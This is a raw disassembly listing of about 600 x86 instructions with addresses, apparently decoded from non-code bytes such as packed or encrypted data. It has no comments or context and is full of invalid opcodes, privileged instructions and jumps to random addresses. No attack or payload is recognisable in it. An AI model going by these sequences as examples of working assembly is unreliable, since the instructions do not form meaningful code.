  420b24:	mov    bl,0xfb
  420b26:	mov    edx,0x3e43d6da
  420b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b2c:	sahf   
  420b2d:	cmp    ah,BYTE PTR [edx+0x1c176ead]
  420b33:	scas   eax,DWORD PTR es:[edi]
  420b34:	call   0x7d9d:0x99452076
  420b3b:	mov    cl,0xe9
  420b3d:	jp     0x420bab
  420b3f:	mov    dl,0xe8
  420b41:	into   
  420b42:	outs   dx,BYTE PTR ds:[esi]
  420b43:	in     eax,dx
  420b44:	adc    DWORD PTR [edx+eiz*1],edx
  420b47:	fldenv [esp+eax*2-0x30]
  420b4b:	add    al,0xc3
  420b4d:	adc    DWORD PTR [esi-0x1cfbd615],ebx
  420b53:	inc    ecx
  420b54:	das    
  420b55:	mov    cl,0x93
  420b57:	push   edx
  420b58:	sbb    al,0x28
  420b5a:	loopne 0x420b6c
  420b5c:	sbb    eax,0xc43d00db
  420b61:	test   DWORD PTR [edx+eiz*2],0x2f819952
  420b68:	into   
  420b69:	leave  
  420b6a:	js     0x420b0c
  420b6c:	inc    ebp
  420b6d:	sbb    DWORD PTR [edi],esp
  420b6f:	nop
  420b70:	inc    ebp
  420b71:	adc    ebx,DWORD PTR [edx+0x7600b00c]
  420b77:	jae    0x420b7a
  420b79:	adc    DWORD PTR [ecx],ebp
  420b7b:	pop    dx
  420b7d:	rcr    ch,0xf5
  420b80:	push   ecx
  420b81:	ret    0xef52
  420b84:	push   ecx
  420b85:	retf   0xbc41
  420b88:	call   0x8712f48e
  420b8d:	pop    ebx
  420b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8f:	xchg   esi,eax
  420b90:	sbb    DWORD PTR [edi+0x40],edi
  420b93:	(bad)  
  420b94:	enter  0x6a05,0x77
  420b98:	les    esi,FWORD PTR [edx-0x1e]
  420b9b:	cmp    al,bh
  420b9d:	pusha  
  420b9e:	es jge 0x420be6
  420ba1:	jg     0x420bc4
  420ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ba4:	int    0x4
  420ba6:	(bad)
  420baa:	bound  esp,QWORD PTR [edi]
  420bac:	sti    
  420bad:	add    cl,ch
  420baf:	popa   
  420bb0:	inc    esp
  420bb1:	cmp    eax,0x1d961e9
  420bb6:	jge    0x420c27
  420bb8:	lods   al,BYTE PTR ds:[esi]
  420bb9:	push   ebx
  420bba:	mov    edx,0xea038444
  420bbf:	popa   
  420bc0:	(bad)  [ebp+0x6f8700e5]
  420bc6:	daa    
  420bc7:	stos   DWORD PTR es:[edi],eax
  420bc8:	push   cs
  420bc9:	dec    esi
  420bca:	or     edx,DWORD PTR [esi+0x52e85a6d]
  420bd0:	push   ds
  420bd1:	inc    esi
  420bd2:	ss cwde 
  420bd4:	adc    bl,bl
  420bd6:	lea    esi,[ecx]
  420bd8:	pop    edi
  420bd9:	xor    BYTE PTR ds:0x70533937,al
  420bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420be0:	dec    eax
  420be1:	dec    ebp
  420be2:	jge    0x420ba3
  420be4:	xor    BYTE PTR [esi+0x50c7e1e7],al
  420bea:	add    al,0x64
  420bec:	jnp    0x420b9f
  420bee:	inc    eax
  420bef:	add    BYTE PTR [ebx],cl
  420bf1:	pop    ds
  420bf2:	pop    ebp
  420bf3:	ret    
  420bf4:	push   0x2a
  420bf6:	dec    esi
  420bf7:	mov    ebx,DWORD PTR [edi+0x39]
  420bfa:	or     esi,DWORD PTR [ebx]
  420bfc:	retf   
  420bfd:	xor    DWORD PTR [edi],edi
  420bff:	and    al,0xf7
  420c01:	adc    edi,DWORD PTR [ebp-0x3f260500]
  420c07:	movzx  ecx,BYTE PTR [ecx]
  420c0a:	xor    ebx,ebx
  420c0c:	adc    al,0xc5
  420c0e:	dec    edi
  420c0f:	and    al,0xbb
  420c11:	ret    0x8af2
  420c14:	push   0xd2c2b54f
  420c19:	sub    eax,0x19a228be
  420c1e:	sti    
  420c1f:	jae    0x420bd1
  420c21:	sti    
  420c22:	rol    DWORD PTR [eax-0x128eed7f],0x0
  420c29:	inc    eax
  420c2a:	fwait
  420c2b:	call   0xc1f5c84d
  420c30:	andnps xmm1,XMMWORD PTR [esi-0x42]
  420c34:	sub    eax,0xefb19f2
  420c39:	inc    ebp
  420c3a:	inc    esi
  420c3b:	mov    esi,0xfb19e22c
  420c40:	gs retf 0x3f9
  420c44:	data16 jo 0x420c48
  420c47:	or     eax,0x3fc1bab7
  420c4c:	and    al,0x53
  420c4e:	addr16 jle 0x420c11
  420c51:	xchg   edi,eax
  420c52:	imul   edi,esp,0x74
  420c55:	rol    DWORD PTR [bp-0x3f30],1
  420c5a:	push   cs
  420c5b:	in     al,0x1c
  420c5d:	imul   edi,esi,0x39878bfc
  420c63:	adc    ecx,DWORD PTR [edi]
  420c65:	xchg   ebp,eax
  420c66:	in     eax,0x50
  420c68:	push   ebp
  420c69:	bound  ebp,QWORD PTR [ebx+0xb]
  420c6c:	push   esp
  420c6d:	jbe    0x420c61
  420c6f:	add    al,0x83
  420c71:	and    al,BYTE PTR [edi-0x9]
  420c74:	or     al,0xd4
  420c76:	jb     0x420cb7
  420c78:	fbstp  TBYTE PTR [edx+0x37]
  420c7b:	das    
  420c7c:	mov    BYTE PTR [ebp+0x503f2d22],ah
  420c82:	mov    dl,0xb0
  420c84:	pop    es
  420c85:	hlt    
  420c86:	jb     0x420c96
  420c88:	sub    BYTE PTR [edi+0x30],0x70
  420c8c:	inc    BYTE PTR [eax]
  420c8e:	sbb    dh,BYTE PTR [ebx]
  420c90:	(bad)  
  420c91:	jmp    DWORD PTR [edx-0x4a]
  420c94:	dec    ecx
  420c95:	mov    ah,BYTE PTR [ebx]
  420c97:	ds hlt 
  420c99:	inc    edx
  420c9a:	call   0xcd32:0xbdfeffca
  420ca1:	mov    dl,BYTE PTR [edx]
  420ca3:	ss hlt 
  420ca5:	inc    edx
  420ca6:	mov    al,ds:0x8223a8b2
  420cab:	xor    cl,dl
  420cad:	or     al,0x27
  420caf:	icebp  
  420cb0:	aam    0xfc
  420cb2:	push   cs
  420cb3:	push   ss
  420cb4:	add    edi,ebp
  420cb6:	ja     0x420c82
  420cb8:	adc    BYTE PTR [eax+0x62],al
  420cbb:	inc    ebx
  420cbc:	inc    edi
  420cbd:	sbb    BYTE PTR [edx+0x45e8474b],ah
  420cc3:	cli    
  420cc4:	enter  0x4e23,0xae
  420cc8:	fisttp QWORD PTR [eax-0x2c2e569]
  420cce:	pop    ebp
  420ccf:	adc    esi,esp
  420cd1:	mov    ah,0x2a
  420cd3:	xchg   esp,eax
  420cd4:	jnp    0x420c9c
  420cd6:	(bad)  
  420cd7:	cmp    bh,BYTE PTR [eax+0x44]
  420cda:	jb     0x420c60
  420cdc:	mov    edi,0xfb0de211
  420ce1:	jle    0x420d07
  420ce3:	fldl2t 
  420ce5:	add    esp,DWORD PTR [edx-0x7]
  420ce8:	xor    edx,ebx
  420cea:	mov    ebp,0x6203e8d7
  420cef:	xor    BYTE PTR [eax-0x5c2aff0f],ch
  420cf5:	and    eax,edi
  420cf7:	stos   BYTE PTR es:[edi],al
  420cf8:	mov    ds:0xa705fba7,al
  420cfd:	sbb    al,0xce
  420cff:	jmp    0x5f50:0x8e2db621
  420d06:	xchg   si,ax
  420d08:	(bad)  
  420d0a:	and    eax,0x1f
  420d0d:	fdiv   st(7),st
  420d0f:	loopne 0x420d54
  420d11:	aam    0xfb
  420d13:	push   esp
  420d14:	inc    esp
  420d15:	inc    edx
  420d16:	and    al,0xce
  420d18:	ret    
  420d19:	mov    bl,0x1
  420d1b:	fisttp DWORD PTR [ebp+0x6c]
  420d1e:	sub    eax,0xd2989335
  420d23:	call   0xd925dad4
  420d28:	xchg   esp,eax
  420d29:	lds    eax,FWORD PTR [edi]
  420d2b:	mov    edx,0x6203e78b
  420d30:	push   eax
  420d31:	sbb    DWORD PTR [esi-0x71],edi
  420d34:	rol    al,0x7e
  420d37:	mov    cs,ebp
  420d39:	fsubp  st(2),st
  420d3b:	or     ebp,edi
  420d3d:	shr    DWORD PTR [edi-0x205aafc9],1
  420d43:	push   ecx
  420d44:	pop    ecx
  420d45:	and    DWORD PTR [esi+esi*8],eax
  420d48:	cmc    
  420d49:	fwait
  420d4a:	sahf   
  420d4b:	fisubr DWORD PTR gs:[ecx-0x77]
  420d4f:	cmp    dl,bl
  420d51:	and    eax,0xc2f94a19
  420d56:	cwde   
  420d57:	add    BYTE PTR [ecx-0x7e37931f],al
  420d5d:	in     eax,0x0
  420d5f:	mov    dh,0xda
  420d61:	neg    BYTE PTR [eax]
  420d63:	bound  edi,QWORD PTR [ecx-0x6e]
  420d66:	xchg   DWORD PTR [edx-0x1701f182],esi
  420d6c:	popa   
  420d6d:	push   eax
  420d6e:	lock sub BYTE PTR [ecx+0x56],0xfb
  420d73:	adc    eax,0xe8ff1b5d
  420d78:	and    BYTE PTR [edx-0x3e],dl
  420d7b:	pop    ds
  420d7c:	and    esp,DWORD PTR [edx-0x579e2242]
  420d82:	push   ebp
  420d83:	pop    ss
  420d84:	in     eax,0x2b
  420d86:	das    
  420d87:	sub    DWORD PTR [ecx+0x4e72f651],ebp
  420d8d:	jg     0x420de2
  420d8f:	jmp    0x32c766fc
  420d94:	sti    
  420d95:	(bad)  
  420d96:	test   DWORD PTR [esi-0x15],eax
  420d99:	fiadd  DWORD PTR [ecx-0x4ba7ec2]
  420d9f:	mov    dh,0xdb
  420da1:	fadd   DWORD PTR [edi+0x784ceb34]
  420da7:	mov    ecx,0xb58d93f6
  420dac:	mov    ebp,0x85a58de2
  420db1:	fsubp  st(0),st
  420db3:	mov    bl,0x5f
  420db5:	fld    DWORD PTR [eax]
  420db7:	jb     0x420e2f
  420db9:	push   edi
  420dba:	repnz add DWORD PTR [eax],0x7cfb57a4
  420dc1:	bound  ecx,QWORD PTR [edx]
  420dc3:	jge    0x420d8a
  420dc5:	jns    0x420d8d
  420dc7:	ss jb  0x420d6f
  420dca:	not    BYTE PTR [edx+ebx*1]
  420dcd:	pop    ss
  420dce:	mov    esp,0xf4f5e139
  420dd3:	mov    edx,0x80dc5e53
  420dd8:	add    BYTE PTR [esi+0xe440d03],bh
  420dde:	repz and bh,bh
  420de1:	jg     0x420e14
  420de3:	adc    ecx,DWORD PTR [ebp-0xe8ce81]
  420de9:	dec    edi
  420dea:	xor    DWORD PTR [ebx],edx
  420dec:	mov    ebp,esp
  420dee:	test   DWORD PTR [eax+0x1cae3cb],ecx
  420df4:	add    BYTE PTR [ebx],cl
  420df6:	push   ebx
  420df7:	jmp    0x420de4
  420df9:	adc    dl,BYTE PTR [ecx-0x4]
  420dfc:	je     0x420dfc
  420dfe:	sub    bh,BYTE PTR [ebx+0x5ddb8266]
  420e04:	mov    edi,DWORD PTR [ebp+0x395b5617]
  420e0a:	dec    edx
  420e0b:	sti    
  420e0c:	push   ebp
  420e0d:	lods   al,BYTE PTR ds:[esi]
  420e0e:	push   edx
  420e0f:	repnz xor edi,DWORD PTR ds:0xbc0054a5
  420e16:	push   ebp
  420e17:	jle    0x420e18
  420e19:	push   cs
  420e1a:	fidivr DWORD PTR [edi-0x2e]
  420e1d:	push   cs
  420e1e:	into   
  420e1f:	jnp    0x420e1b
  420e21:	add    BYTE PTR [edi+esi*8-0x4],dh
  420e25:	jg     0x420e14
  420e27:	fisttp DWORD PTR [ecx+0x73e03ef1]
  420e2d:	outs   dx,BYTE PTR ds:[esi]
  420e2e:	cmp    BYTE PTR [edx+0x1f],ah
  420e31:	sbb    BYTE PTR [ebx-0x345ffe63],cl
  420e37:	aad    0xd
  420e39:	inc    ebp
  420e3a:	mov    edi,0x8d331339
  420e3f:	pop    ecx
  420e40:	shl    DWORD PTR [ebp-0x68],1
  420e43:	sbb    eax,0x50c2740b
  420e48:	cld    
  420e49:	jne    0x420eca
  420e4b:	push   esp
  420e4c:	jmp    0x6200:0x79b72feb
  420e53:	das    
  420e54:	jg     0x420e3e
  420e56:	cwde   
  420e57:	add    esp,DWORD PTR [edx]
  420e59:	jae    0x420de1
  420e5b:	ror    BYTE PTR [ebx-0x4a1cbaa7],cl
  420e61:	push   esp
  420e62:	jno    0x420de4
  420e64:	and    DWORD PTR [edx],edx
  420e66:	mov    dh,0x28
  420e68:	mov    edi,0xf46ee0ff
  420e6d:	mov    dh,0xa8
  420e6f:	xor    cl,BYTE PTR [eax]
  420e71:	and    bh,0x72
  420e74:	pushf  
  420e75:	or     DWORD PTR [ecx+0x73],ebx
  420e78:	cdq    
  420e79:	add    eax,0xd78c3096
  420e7e:	stc    
  420e7f:	cmp    BYTE PTR [esi+ebp*8-0x23d0dc],cl
  420e86:	add    BYTE PTR [eax-0x35],ah
  420e89:	mov    ebp,0x339f482
  420e8e:	cmp    ebx,esi
  420e90:	and    eax,0xce2688f4
  420e95:	adc    BYTE PTR [ebx-0x78f3d95e],al
  420e9b:	mov    ch,BYTE PTR [ebx-0x794f7cf7]
  420ea1:	add    al,0xc6
  420ea3:	gs xor al,al
  420ea6:	mov    BYTE PTR [eax+edx*2-0x7c9decbb],bl
  420ead:	mov    ecx,0x46238b88
  420eb2:	push   esp
  420eb3:	jmp    0x62967099
  420eb8:	aaa    
  420eb9:	jg     0x420e3d
  420ebb:	test   eax,0xb08303bd
  420ec0:	lds    eax,FWORD PTR [edi]
  420ec2:	jg     0x420f3c
  420ec4:	inc    edi
  420ec5:	and    ah,bh
  420ec7:	cmc    
  420ec8:	mov    DWORD PTR ds:0x6cd97589,0x20aded19
  420ed2:	rol    BYTE PTR [ecx-0x8246e23],1
  420ed8:	cwde   
  420ed9:	jmp    0xdd7afee
  420ede:	add    bl,bl
  420ee0:	dec    ecx
  420ee1:	fs xor eax,0xdb4be5b0
  420ee7:	pop    ebp
  420ee8:	lds    esp,FWORD PTR [ecx]
  420eea:	xchg   DWORD PTR [eax],eax
  420eec:	or     al,dh
  420eee:	in     eax,dx
  420eef:	mov    WORD PTR [esi],gs
  420ef1:	xor    al,0x34
  420ef3:	bound  ebx,QWORD PTR [ebx+0xa83ead9]
  420ef9:	add    cl,BYTE PTR [ebx+0x74f94197]
  420eff:	popf   
  420f00:	push   es
  420f01:	test   eax,0xe5feb512
  420f06:	icebp  
  420f07:	stc    
  420f08:	xor    eax,0x5d4766d9
  420f0d:	sbb    bh,0x3
  420f10:	pop    edi
  420f11:	pop    ecx
  420f12:	fs inc ebx
  420f14:	push   ebp
  420f15:	ror    DWORD PTR [esi],cl
  420f17:	dec    ecx
  420f18:	dec    esi
  420f19:	xlat   BYTE PTR ds:[ebx]
  420f1a:	aad    0x9
  420f1c:	fild   DWORD PTR [eax+0x4e]
  420f1f:	or     ebx,ebx
  420f21:	dec    ecx
  420f22:	test   BYTE PTR [ebx+0x47],0x52
  420f26:	in     eax,dx
  420f27:	pushf  
  420f28:	call   0xb7c8be09
  420f2d:	shr    ebp,0xdc
  420f30:	mov    ah,0xc5
  420f32:	hlt    
  420f33:	mov    WORD PTR [ecx],fs
  420f35:	cmc    
  420f36:	stc    
  420f37:	xchg   ch,dl
  420f39:	(bad)  
  420f3a:	fmul   QWORD PTR [edx-0x790fcb8b]
  420f40:	mov    bl,0xc4
  420f42:	in     al,0xd4
  420f44:	mov    ebp,0x5e6000b6
  420f49:	sahf   
  420f4a:	xchg   DWORD PTR [edi],esp
  420f4c:	mov    ds:0xfdbea0,eax
  420f51:	popa   
  420f52:	push   edx
  420f53:	push   esp
  420f54:	add    eax,0x5dc95a6a
  420f59:	xor    DWORD PTR [ebp+0x3d6d8e53],esp
  420f5f:	sti    
  420f60:	inc    esi
  420f61:	fld    DWORD PTR [ebp-0x80]
  420f64:	add    BYTE PTR [esi-0x3b],ah
  420f67:	add    al,0x28
  420f69:	and    al,0xcc
  420f6b:	repz cli 
  420f6d:	mov    eax,ds:0xed60f25b
  420f72:	add    ch,BYTE PTR ds:[ecx+0x6d]
  420f76:	xchg   ebp,eax
  420f77:	shr    DWORD PTR [eax+edx*2-0x36],0xd
  420f7c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420f7e:	mov    BYTE PTR [edx],0xd2
  420f81:	addr16 push edi
  420f83:	ss xchg edx,eax
  420f85:	popa   
  420f86:	pop    eax
  420f87:	push   ds
  420f88:	jmp    0xe529ac41
  420f8d:	mov    DWORD PTR [ebp+0x5be1ee00],esp
  420f93:	shl    al,0x64
  420f96:	pop    edx
  420f97:	into   
  420f98:	frstor [eax+0x58]
  420f9b:	push   ds
  420f9c:	jmp    0x7242e9c4
  420fa1:	or     bh,bl
  420fa3:	add    al,0x9a
  420fa5:	nop
  420fa6:	and    DWORD PTR [ebp+0x530ada20],eax
  420fac:	xchg   esi,eax
  420fad:	or     al,0x3d
  420faf:	sti    
  420fb0:	lds    edx,FWORD PTR es:[ecx-0xd]
  420fb4:	xchg   DWORD PTR [eax],eax
  420fb6:	mov    esi,0xe0ef74e7
  420fbb:	jg     0x420fbb
  420fbd:	sahf   
  420fbe:	jmp    0xc053:0x8500854b
  420fc5:	mov    ecx,0x8005dad4
  420fca:	jl     0x420fe2
  420fcc:	mov    edx,0x7614985
  420fd1:	test   DWORD PTR [ebx+0x3d2b0562],edi
  420fd7:	dec    ebp
  420fd8:	cmp    ebx,ebp
  420fda:	dec    ecx
  420fdb:	dec    ebp
  420fdc:	sbb    DWORD PTR [edi+0x7d],ebx
  420fdf:	repnz (bad) 
  420fe1:	mov    bh,0x64
  420fe3:	aad    0x5
  420fe5:	add    dh,0x9a
  420fe8:	jb     0x420ff0
  420fea:	(bad)  
  420feb:	or     BYTE PTR [eax+0x2],dh
  420fee:	ret    0x5840
  420ff1:	ret    0xda37
  420ff4:	xor    eax,eax
  420ff6:	xchg   BYTE PTR [eax],cl
  420ff8:	jo     0x421009
  420ffa:	mov    ah,BYTE PTR [eax]
  420ffc:	cld    
  420ffd:	(bad)  
  420ffe:	fcomp  QWORD PTR [esi+0x71]
  421001:	pop    es
  421002:	mov    ds:0x8b06fb87,eax
  421007:	repz or edi,DWORD PTR [ecx]
  42100a:	or     ah,BYTE PTR [ecx+0x7]
  42100d:	(bad)  
  42100e:	cli    
  42100f:	xlat   BYTE PTR ds:[ebx]
  421010:	mov    al,ds:0xd150fb40
  421015:	je     0x420fe0
  421017:	dec    esp
  421018:	add    edx,eax
  42101a:	add    bl,al
  42101c:	fnstenv [ecx]
  42101e:	rol    BYTE PTR [esi+0x8],0x70
  421022:	(bad)  
  421025:	cld    
  421026:	(bad)  
  421027:	jl     0x421088
  421029:	jno    0x421032
  42102b:	xor    eax,DWORD PTR [edi-0xcc4f905]
  421031:	or     edi,DWORD PTR [ecx]
  421033:	mov    edx,0x8ac70760
  421038:	and    DWORD PTR [ebp-0x77cf9dc0],ebx
  42103e:	rcl    DWORD PTR [esi],1
  421040:	xor    cl,BYTE PTR [ecx+eax*1+0x52ff47a0]
  421047:	jmp    0x3197c517
  42104c:	lock into 
  42104e:	cmc    
  42104f:	(bad)  [ebx+ebx*1-0x7e]
  421053:	nop
  421054:	fwait
  421055:	loop   0x4210a7
  421057:	jmp    0xe9970559
  42105c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105d:	adc    BYTE PTR [ecx],ch
  42105f:	dec    ebx
  421060:	mov    dh,0x39
  421062:	jae    0x4210b9
  421064:	enter  0xd08,0xe6
  421068:	jb     0x421002
  42106a:	pop    es
  42106b:	jmp    0x93f8:0xa448be31
  421072:	jmp    0xb5b9:0x5c20edd9
  421079:	cs jb  0x4210d9
  42107c:	stc    
  42107d:	retf   0xb7
  421080:	mov    BYTE PTR [edx],dh
  421082:	add    al,0x80
  421084:	sbb    al,0x32
  421086:	dec    DWORD PTR [eax-0x397db551]
  42108c:	outs   dx,BYTE PTR ds:[esi]
  42108d:	xor    BYTE PTR [esi+0x3e798c2e],al
  421093:	or     esp,DWORD PTR [edx-0x21]
  421096:	inc    esp
  421097:	push   ebp
  421098:	jmp    0x4f13943f
  42109d:	(bad)  
  42109e:	mov    cl,0x88
  4210a0:	cs (bad) 
  4210a2:	clc    
  4210a3:	push   edx
  4210a4:	sub    eax,0x5a23a0c7
  4210a9:	out    0x17,eax
  4210ab:	sbb    BYTE PTR [ecx-0xaf30c82],0x3e
  4210b2:	or     al,0x66
  4210b4:	(bad)  
  4210b6:	adc    al,0x98
  4210b8:	push   0xffffffb3
  4210ba:	jo     0x4210a7
  4210bc:	loop   0x4210d8
  4210be:	out    0xc8,eax
  4210c0:	daa    
  4210c1:	(bad)  
  4210c2:	xchg   esp,eax
  4210c3:	sub    esp,DWORD PTR [esi]
  4210c5:	sahf   
  4210c6:	sahf   
  4210c7:	xchg   BYTE PTR [ebx+0x7c80f0c6],dl
  4210cd:	xlat   BYTE PTR ds:[ebx]
  4210ce:	mov    ds:0xe2d8eb5b,eax
  4210d3:	xor    DWORD PTR [edx],0x27
  4210d6:	dec    ebx
  4210d7:	mov    ebp,DWORD PTR [eax+edx*2+0x2d]
  4210db:	call   0x97e2673d
  4210e0:	arpl   WORD PTR [edx+0x18],dx
  4210e3:	mov    esi,0xe9cd2300
  4210e8:	mov    dh,0xea
  4210ea:	sub    al,0x18
  4210ec:	xchg   DWORD PTR [esi+eax*8],ebx
  4210ef:	in     eax,dx
  4210f0:	shr    ch,1
  4210f2:	adc    DWORD PTR [esi+0x393da08e],esp
  4210f8:	sub    al,0xcb
  4210fa:	cmp    bl,BYTE PTR [edx-0x6a7215e4]
  421100:	sbb    BYTE PTR [ebx],0x3c
  421103:	fs inc ebx
  421105:	push   esi
  421106:	xchg   esi,eax
  421107:	scas   eax,DWORD PTR es:[edi]
  421108:	mov    BYTE PTR [ecx+edx*1+0x2ceab6a6],bh
  42110f:	sbb    BYTE PTR [edi-0x2f1a39dc],al
  421115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421116:	adc    DWORD PTR [esi],esp
  421118:	mov    fs,WORD PTR [eax]
  42111a:	cmp    eax,0x3b8d2bb9
  42111f:	push   edx
  421120:	sbb    al,0xda
  421122:	lea    ecx,[ebp-0x80]
  421125:	fwait
  421126:	cmp    ebp,DWORD PTR [ebx+eax*2+0x6e]
  42112a:	xchg   esi,eax
  42112b:	das    
  42112c:	mov    ah,dh
  42112e:	adc    DWORD PTR [eax],eax
  421130:	sub    dh,ah
  421132:	push   eax
  421133:	in     al,dx
  421134:	call   0x14ea:0x262fa4ef
  42113b:	mov    bh,0xb6
  42113d:	popa   
  42113e:	(bad)  
  42113f:	sub    BYTE PTR [eax+ebx*1-0x39],0x4
  421144:	fs push ebx
  421146:	(bad)  
  421147:	or     BYTE PTR [eax+0x0],ch
  42114a:	pop    ebx
  42114b:	cmp    eax,0xc5d9fefb
  421150:	(bad)  
  421151:	popa   
  421152:	and    dl,BYTE PTR [edi-0x40]
  421155:	jno    0x4210e4
  421157:	add    bh,BYTE PTR [esi-0xf]
  42115a:	mov    ebx,0x5e299b02
  42115f:	int3   
  421160:	inc    ebp
  421161:	pop    esp
  421162:	pop    esi
  421163:	push   eax
  421164:	ret    
  421165:	fs mov edi,es
  421168:	adc    DWORD PTR [edi+0x1f],ecx
  42116b:	std    
  42116c:	je     0x421175
  42116e:	xchg   esi,eax
  42116f:	rol    BYTE PTR [eax],0xee
  421172:	loope  0x4211cb
  421174:	leave  
  421175:	fsubrp st(5),st
  421177:	sbb    edi,esp
  421179:	add    ecx,esi
  42117b:	cmp    al,0xfb
  42117d:	sahf   
  42117e:	stc    
  42117f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421180:	lea    ebp,[esi+ebx*2]
  421183:	test   eax,0x3d68f9e8
  421188:	sti    
  421189:	xchg   edx,eax
  42118a:	outs   dx,DWORD PTR ds:[esi]
  42118b:	push   esi
  42118c:	into   
  42118d:	cmc    
  42118e:	bound  ecx,QWORD PTR [eax]
  421190:	iret   
  421191:	pandn  mm1,mm3
  421194:	pop    ebx
  421195:	shld   DWORD PTR [edi-0x599e1242],ebx,cl
  42119c:	xchg   DWORD PTR [ebp-0x1b],ecx
  42119f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a0:	or     al,0x64
  4211a2:	mov    ds:0xf34e50e2,eax
  4211a7:	out    0x51,al
  4211a9:	add    dl,bl
  4211ab:	fild   QWORD PTR [esi+0x10]
  4211ae:	add    BYTE PTR [eax],dh
  4211b0:	adc    BYTE PTR [ebx],al
  4211b2:	call   0x3ef376
  4211b7:	(bad)  
  4211b8:	xchg   ebx,eax
  4211b9:	dec    esi
  4211ba:	mov    esi,DWORD PTR [edi+0x4a]
  4211bd:	dec    esi
  4211be:	or     al,0x6
  4211c0:	sbb    BYTE PTR [ebx],dl
  4211c2:	push   eax
  4211c3:	je     0x42122d
  4211c5:	sqrtps xmm1,xmm2
  4211c8:	fild   QWORD PTR [esi+0x10]
  4211cb:	lock lsl ebp,ax
  4211cf:	mov    al,0xe2
  4211d1:	cld    
  4211d2:	call   esi
  4211d4:	xchg   ebx,eax
  4211d5:	sub    ah,0x87
  4211d8:	mov    DWORD PTR [ebx+ecx*4+0x32],edx
  4211dc:	dec    ebx
  4211dd:	stc    
  4211de:	mov    DWORD PTR [edi+0x26850b39],esi
  4211e4:	imul   ecx,DWORD PTR [ecx],0x5d58cb8
  4211ea:	adc    BYTE PTR [edx],0xaa
  4211ed:	sti    
  4211ee:	dec    DWORD PTR [ebx+0x4b]
  4211f1:	inc    edi
  4211f2:	and    al,0x13
  4211f4:	mov    bl,ah
  4211f6:	repnz cmc 
  4211f8:	fdivp  st(4),st
  4211fa:	mov    edi,ebx
  4211fc:	pop    eax
  4211fd:	cmc    
  4211fe:	jns    0x4211fc
  421200:	popf   
  421201:	push   esp
  421202:	add    ah,bh
  421204:	push   ebp
  421205:	call   0x82d83a86
  42120a:	inc    esp
  42120b:	das    
  42120c:	inc    esi
  42120d:	add    BYTE PTR [edi+ebx*1-0x2e],0x51
  421212:	add    DWORD PTR [eax],0xfffbd5bd
  421218:	sti    
  421219:	push   esp
  42121a:	std    
  42121b:	inc    DWORD PTR [edi+ebx*8+0x7c]
  42121f:	jl     0x4211f2
  421221:	lahf   
  421222:	cld    
  421223:	jmp    DWORD PTR [edx-0x5d]
  421226:	xchg   esi,eax
  421227:	lds    ebx,FWORD PTR [esi]
  421229:	aam    0xf0
  42122b:	(bad)  
  42122c:	out    dx,al
  42122d:	sbb    edx,ecx
  42122f:	mov    ah,BYTE PTR [esi]
  421231:	aam    0xf4
  421233:	out    0x2d,eax
  421235:	aaa    
  421236:	add    al,0x0
  421238:	(bad)  [ebx-0x25]
  42123b:	(bad)  
  42123d:	out    dx,eax
  42123e:	mov    esi,DWORD PTR ds:0x23db6395
  421244:	fyl2xp1 
  421246:	push   ss
  421247:	jae    0x421287
  421249:	adc    al,0xb4
  42124b:	dec    esi
  42124c:	adc    eax,0xbe74ac7
  421251:	cmp    al,0x19
  421253:	cld    
  421254:	fld    DWORD PTR [edi+0x7f]
  421257:	cld    
  421258:	call   0xd7c2108c
  42125d:	sub    eax,0x2e7e7b7f
  421262:	push   DWORD PTR [edx+0x74]
  421265:	mov    ebx,0x1b6a2398
  42126a:	cmp    BYTE PTR [di],0xf6
  42126e:	or     BYTE PTR [edi-0x402bbd69],al
  421274:	cmp    DWORD PTR [ecx+0x58],eax
  421277:	jns    0x421279
  421279:	bound  edi,QWORD PTR [edi]
  42127b:	jg     0x421205
  42127d:	sub    DWORD PTR [ebx+0x5e],ecx
  421280:	or     BYTE PTR [ebx+0x42],ah
  421283:	mov    esp,es
  421285:	test   eax,0xe15ab9f0
  42128a:	jle    0x421294
  42128c:	ret    0x426a
  42128f:	test   bl,ch
  421291:	data16 int 0xb1
  421294:	mov    bl,bh
  421296:	mov    ebx,0x1e66861a
  42129b:	out    dx,eax
  42129c:	or     bh,0xd9
  42129f:	fmul   QWORD PTR ds:0xe9911a
  4212a5:	loop   0x4212e9
  4212a7:	jp     0x4212ad
  4212a9:	(bad)  
  4212aa:	fstp   DWORD PTR [esi-0x38]
  4212ad:	adc    ecx,0x37162b9b
  4212b3:	cmp    bl,BYTE PTR [ecx]
  4212b5:	fisubr DWORD PTR [ecx]
  4212b7:	ins    BYTE PTR es:[edi],dx
  4212b8:	adc    ch,BYTE PTR [eax+eiz*8]
  4212bb:	jno    0x42126e
  4212bd:	popf   
  4212be:	fild   QWORD PTR [ecx+0x2d]
  4212c1:	push   ss
  4212c2:	in     al,dx
  4212c3:	sub    DWORD PTR [ebx-0x750602df],ecx
  4212c9:	and    ebp,edi
  4212cb:	fnsave [esp+edi*8+0x6202e91e]
  4212d2:	fldenv [edx+edx*1-0x11]
  4212d6:	loopne 0x421340
  4212d8:	sbb    ah,BYTE PTR [esi+0x38]
  4212db:	jmp    0x18a3:0xe3d90098
  4212e2:	push   esi
  4212e3:	cmp    BYTE PTR [edx+0x42],bl
  4212e6:	mov    eax,ds:0xdb02fdfd
  4212eb:	push   cs
  4212ec:	pop    esp
  4212ed:	mov    DWORD PTR [ecx+0x6b3ed1c9],0x898ce9da
  4212f7:	std    
  4212f8:	fnstcw WORD PTR [edi-0x1b]
  4212fb:	lods   al,BYTE PTR ds:[esi]
  4212fc:	repz sbb BYTE PTR [ecx+0x2f8ccdfd],dl
  421303:	cmp    BYTE PTR ds:0x388a41e0,dl
  421309:	mov    cl,0xda
  42130b:	and    eax,DWORD PTR [ecx-0x7dc8050b]
  421311:	mov    ebp,gs
  421313:	pop    ecx
  421314:	jp     0x4212b3
  421316:	in     eax,dx
  421317:	fiadd  WORD PTR [eax]
  421319:	imul   edx,esp,0xbded80e2
  42131f:	retf   
  421320:	add    ah,bl
  421322:	shl    DWORD PTR [eax+0x7c],cl
